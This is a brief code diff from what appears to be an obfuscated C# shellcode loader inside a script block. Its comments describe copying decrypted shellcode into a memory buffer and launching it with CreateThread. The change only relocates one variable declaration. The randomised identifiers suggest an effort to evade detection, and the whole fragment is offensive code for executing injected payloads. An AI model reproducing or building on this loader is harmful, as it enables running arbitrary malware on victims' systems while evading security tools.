@@ -89,9 +89,9 @@
         
         // Copy our decrypted shellcode ito the buffer
         System.Runtime.InteropServices.Marshal.Copy(e4qRS,0,zG5fzCKEhae,e4qRS.Length);
-        IntPtr aj5QpPE = IntPtr.Zero;
 
         // Create a thread that contains our buffer
+        IntPtr aj5QpPE = IntPtr.Zero;
         IntPtr oiAJp5aJjiZV = CreateThread(IntPtr.Zero,UIntPtr.Zero,zG5fzCKEhae,IntPtr.Zero,0,ref aj5QpPE);
     }
 </script>
